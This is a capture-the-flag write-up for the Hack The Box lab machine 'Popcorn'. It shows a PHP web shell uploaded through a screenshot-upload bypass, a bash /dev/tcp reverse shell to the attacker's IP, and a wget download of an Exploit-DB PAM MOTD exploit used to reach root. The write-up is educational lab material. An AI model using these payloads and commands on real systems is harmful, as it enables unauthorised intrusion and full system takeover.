# Hack The Box - Popcorn

## Machine Information

| Item | Value |
|---|---|
| Machine | Popcorn |
| Platform | Linux |
| Difficulty | Medium |
| Target IP | 10.129.5.39 |
| Hostname | popcorn.htb |
| Initial Access | PHP file upload bypass |
| Privilege Escalation | PAM MOTD file tampering / CVE-2010-0832 |

---

## Summary

Popcorn is a Linux machine exposing only SSH and an Apache web server. The initial website redirects to `popcorn.htb`, where directory enumeration reveals a `/torrent/` application running Torrent Hoster.

The application allows unauthenticated account registration. After creating an account and uploading a valid `.torrent` file, the torrent entry can be edited. The edit functionality includes a screenshot upload feature that performs weak validation. By uploading a PHP payload with an image-like filename and modifying the multipart request content type to `image/png`, arbitrary PHP code execution is achieved.

A reverse shell is obtained as `www-data`. Privilege escalation is performed by abusing a known PAM MOTD file tampering vulnerability affecting Ubuntu 9.10 with PAM 1.1.0. Exploit-DB `14339.sh` is used to obtain root privileges.

---

# 1. Enumeration

## 1.1 TCP Port Discovery

A full TCP port scan was performed against the target.

```bash
nmap -p- --min-rate 5000 -Pn 10.129.5.39 -oN scans/tcp-full.txt
````

Open ports:

```text
22/tcp  open  ssh
80/tcp  open  http
```

## 1.2 Service and Version Enumeration

```bash
nmap -sC -sV -Pn -p22,80 10.129.5.39 -oN scans/tcp-services.txt
```

Relevant results:

```text
22/tcp open  ssh   OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http  Apache httpd 2.2.12
```

The attack surface is very small. SSH is exposed, but without credentials the web service is the logical first target.

---

# 2. Web Enumeration

## 2.1 Hostname Redirect

Accessing the web server by IP redirects to `popcorn.htb`.

```bash
curl -I http://10.129.5.39
```

Result:

```text
HTTP/1.1 301 Moved Permanently
Location: http://popcorn.htb/
Server: Apache/2.2.12 (Ubuntu)
```

The hostname was added to `/etc/hosts`.

```bash
echo "10.129.5.39 popcorn.htb" | sudo tee -a /etc/hosts
```

## 2.2 Directory Enumeration

The root web page did not expose much useful functionality, so directory brute forcing was performed against the hostname.

```bash
feroxbuster -u http://popcorn.htb \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -x php,txt,bak,old \
  -k -n -t 10 \
  --depth 1 \
  -o enum/web/ferox-popcorn-focused.txt
```

A relevant directory was discovered:

```text
/torrent/
```

Browsing to the directory revealed a Torrent Hoster web application.

```text
http://popcorn.htb/torrent/
```

---

# 3. Initial Access

## 3.1 Torrent Hoster Application

The `/torrent/` application allowed user registration without restrictions. After registering and logging in, the application allowed users to upload torrent files.

A valid torrent file was created locally.

```bash
cd /tmp
echo "Popcorn HTB test torrent" > popcorn-test.txt

mktorrent -a http://popcorn.htb/announce \
  -o popcorn-test.torrent \
  popcorn-test.txt
```

The torrent file was then uploaded through the normal upload form:

```text
http://popcorn.htb/torrent/torrents.php?mode=upload
```

After the torrent was uploaded, the torrent entry could be edited.

---

## 3.2 Screenshot Upload Bypass

The edit page contained an `Update Screenshot` feature. This upload functionality performed weak validation:

1. The uploaded filename needed to include an image extension.
2. The multipart `Content-Type` needed to be set to an image MIME type.

A PHP payload was prepared with an image-like filename.

```bash
cat > writeup.png <<'EOF'
PNG
<?php echo system($_GET['cmd']); ?>
EOF
```

The file was selected in the screenshot upload field and the request was intercepted with Burp Suite.

The original multipart section looked similar to this:

```http
Content-Disposition: form-data; name="file"; filename="writeup.png"
Content-Type: image/png

PNG
<?php echo system($_GET['cmd']); ?>
```

The filename was modified in Burp Repeater to force a PHP extension while keeping the image content type:

```http
Content-Disposition: form-data; name="file"; filename="writeup.png.php"
Content-Type: image/png

PNG
<?php echo system($_GET['cmd']); ?>
```

The upload was accepted by the application.

---

## 3.3 Locating the Uploaded PHP File

The upload directory allowed directory listing.

```bash
curl -s http://popcorn.htb/torrent/upload/ | grep -Ei "php|png|gif|jpg"
```

The uploaded PHP file was visible:

```text
385ed26c7a929ed3286b98ba13588aa49560e798.php
```

Command execution was confirmed with the `id` command.

```bash
curl 'http://popcorn.htb/torrent/upload/385ed26c7a929ed3286b98ba13588aa49560e798.php?cmd=id'
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed remote command execution as the Apache user.

---

## 3.4 Reverse Shell

A Netcat listener was started on the attacker machine.

```bash
nc -lvnp 1234
```

The reverse shell was triggered through the uploaded PHP web shell.

```bash
curl --get 'http://popcorn.htb/torrent/upload/385ed26c7a929ed3286b98ba13588aa49560e798.php' \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.15.59/1234 0>&1"'
```

A shell was received as `www-data`.

```bash
whoami
id
hostname
```

Result:

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
popcorn
```

The user flag was located in George's home directory.

```bash
cat /home/george/user.txt
```

---

# 4. Privilege Escalation

## 4.1 Local Enumeration

The shell was upgraded to a semi-interactive shell.

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
export TERM=xterm
```

George's home directory was inspected.

```bash
ls -la /home/george
ls -lAR /home/george/.cache
```

A notable file was present:

```text
/home/george/.cache/motd.legal-displayed
```

System version information showed that the target was running Ubuntu 9.10.

```bash
cat /etc/issue
cat /etc/lsb-release 2>/dev/null
uname -a
```

Result:

```text
Ubuntu 9.10
DISTRIB_RELEASE=9.10
DISTRIB_CODENAME=karmic
Linux popcorn 2.6.31-14-generic-pae
```

The installed PAM version was also checked.

```bash
dpkg -l | grep -i pam
```

Relevant packages:

```text
libpam-modules  1.1.0-2ubuntu1
libpam-runtime  1.1.0-2ubuntu1
libpam0g        1.1.0-2ubuntu1
```

This matched the known PAM MOTD file tampering privilege escalation vulnerability.

---

## 4.2 Exploit Identification

The exploit was located with SearchSploit.

```bash
searchsploit 14339
```

Result:

```text
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)
CVE-2010-0832
```

The exploit was copied locally.

```bash
searchsploit -m linux/local/14339.sh
```

Result:

```text
Copied to: /home/zendeni/htb_labs/popcorn/14339.sh
```

---

## 4.3 Exploit Transfer

A Python HTTP server was started on the attacker machine.

```bash
cd /home/zendeni/htb_labs/popcorn
python3 -m http.server 8000
```

The exploit was downloaded to the target.

```bash
cd /tmp
wget http://10.10.15.59:8000/14339.sh
chmod +x 14339.sh
```

---

## 4.4 Root Shell

The exploit was executed.

```bash
cd /tmp
./14339.sh
```

When prompted, the password `toor` was used as instructed by the exploit.

Root access was confirmed.

```bash
whoami
id
hostname
```

Result:

```text
root
uid=0(root) gid=0(root) groups=0(root)
popcorn
```

The root flag was then read.

```bash
cat /root/root.txt
```

---

# 5. Attack Chain

```text
1. Performed TCP port discovery.
2. Identified SSH and Apache HTTP services.
3. Added popcorn.htb to /etc/hosts after observing HTTP redirect.
4. Enumerated web directories and discovered /torrent/.
5. Registered a user account in Torrent Hoster.
6. Created and uploaded a valid .torrent file.
7. Edited the torrent entry and intercepted the screenshot upload request.
8. Changed the uploaded filename to include .php while keeping Content-Type as image/png.
9. Located the uploaded PHP file in /torrent/upload/.
10. Confirmed command execution through the cmd parameter.
11. Triggered a reverse shell as www-data.
12. Enumerated the system and identified Ubuntu 9.10 with PAM 1.1.0.
13. Found motd.legal-displayed in George's .cache directory.
14. Used Exploit-DB 14339 / CVE-2010-0832 to escalate privileges.
15. Obtained root access.
```
